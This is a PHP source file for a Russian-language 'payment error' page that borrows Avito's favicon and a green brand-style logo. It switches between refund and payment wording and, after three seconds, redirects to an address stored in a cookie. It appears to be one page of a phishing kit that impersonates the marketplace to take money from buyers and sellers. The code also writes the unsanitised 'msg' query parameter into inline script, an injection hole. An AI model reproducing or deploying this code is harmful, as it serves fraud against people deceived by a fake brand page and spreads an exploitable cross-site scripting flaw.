<?php

header( "Refresh:3;". $_COOKIE['cok']);

$heading_total = $_POST['voz'] == 1 ? "Итого к возврату: " : "Итого к оплате: ";
$heading_button = $_POST['voz'] == 1 ? "Подтвердить" : "Оплатить";
$title = $_POST['voz'] == 1 ? "Страница возврата" : "Страница оплаты";

$error = $_GET['msg'] ? $_GET['msg'] : $error;
$heading = !$_GET['h'] ? $heading : $_GET['h'];

?>


<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/common.css">
		<link rel="shortcut icon" type="image/png" href="https://www.avito.st/favicon.ico">

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.js"></script>
		<script type="text/javascript" src="js/common.js"></script>
		<script type="text/javascript">
			var heading_button = "<i class='fas fa-chevron-right'></i> <?php echo $heading_button; ?>";
		</script>

		<meta charset="utf-8">
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

		<title><?php echo $title; ?></title>
	</head>

	<body>
		
<br>
		<div class="block-method">
			<div class="row" style="margin-top: -20px;">
				<div class="list-method">
					<div class="row">
						

<svg viewBox="0 0 154 42" fill="none" xmlns="http://www.w3.org/2000/svg" class="logo" data-v-208a69ab="">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M104 42H114.944L119.646 28.7887L124.535 24.7392L128.386 36.6869C129.577 40.3797 130.803 42 133.477 42H141.856L133.212 18.5552L154 0H140.575L127.956 13.2116C126.486 14.7496 124.999 16.2634 123.508 18.0715H123.381L129.682 0H118.737L104 42Z" fill="#1AB248" data-v-208a69ab=""></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M103.528 0.00166416C106.96 0.00221654 110.289 0.00275227 113.077 0.00299438L110.818 6.93737C110.108 9.11608 108.306 10.1584 104.334 10.1584C97.4378 10.1584 87.2335 10.1572 80.3365 10.156L82.5955 3.22165C83.3052 1.04174 85.107 0 89.079 0C93.1875 0 98.47 0.000850164 103.528 0.00166416ZM83.5091 15.921C90.4051 15.921 100.61 15.9222 107.507 15.924L105.248 22.8581C104.538 25.0374 102.736 26.0791 98.7639 26.0791C91.8676 26.0791 81.6633 26.0779 74.7663 26.0761L77.0253 19.1427C77.735 16.963 79.537 15.921 83.5091 15.921ZM101.663 31.844C94.7665 31.8428 84.5622 31.8416 77.6659 31.8416C73.6932 31.8416 71.8918 32.8839 71.1821 35.062L68.9231 41.9973C75.8201 41.9979 86.0244 42 92.921 42C96.8927 42 98.6948 40.9574 99.4045 38.7781L101.663 31.844Z" fill="#1AB248" data-v-208a69ab=""></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M54.3767 10.116L60.25 10.1184C65.2542 10.1196 64.112 16.1685 61.5794 22.0639C59.3478 27.26 55.3927 31.8454 50.6743 31.8448L40.883 31.8436C36.9776 31.8436 35.177 32.8859 34.4175 35.0639L32 41.9988L39.1798 42L46.1982 41.9434C52.4223 41.8937 57.5178 41.4583 63.4765 36.2753C69.7737 30.8001 77.1159 16.5763 75.858 8.3494C74.8726 1.90253 71.2934 0.00299423 62.6263 0.00239538L46.8324 0L37.6363 26.0492L43.4793 26.0564C46.9568 26.0602 48.702 26.1025 50.5518 21.2848L54.3767 10.116Z" fill="#1AB248" data-v-208a69ab=""></path>
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M27.376 10.1522L22.9585 10.1534C14.1091 10.1576 6.52603 31.8484 16.9894 31.8448L23.7124 31.8436C27.5898 31.8436 30.4682 33.214 29.1937 36.9092L27.4374 41.9988L20.3071 42L14.5073 41.9434C7.08759 41.8716 2.29964 38.3315 0.575665 32.9562C-1.28993 27.1394 1.34396 15.0071 8.98851 7.23525C13.4241 2.72654 19.5683 0.00299423 27.446 0.00239538L42 0L39.7249 6.35674C38.255 10.4639 35.2518 10.1576 33.538 10.157L27.376 10.1522Z" fill="#1AB248" data-v-208a69ab=""></path>
                                 </svg>
							
					
					</div>
					
				</div>
				<div class="divider" style="margin-top: 20px;"></div>
			</div>
		</div>

        <div class="block-form" id="cl">
    					<h3 for="input-cap" style="text-align: center;">Ошибка при оплате!<div class="col-xs-16"><br>
					</div></h3>

		</div>

	</body>

	<?php 
		if (isset($error) && $error !== "") {
			echo '
			<script type="text/javascript">
				$(".label-error").text("' . $error . '");
				$(".block-error").show();
			</script>
			';
		}
	?>
</html>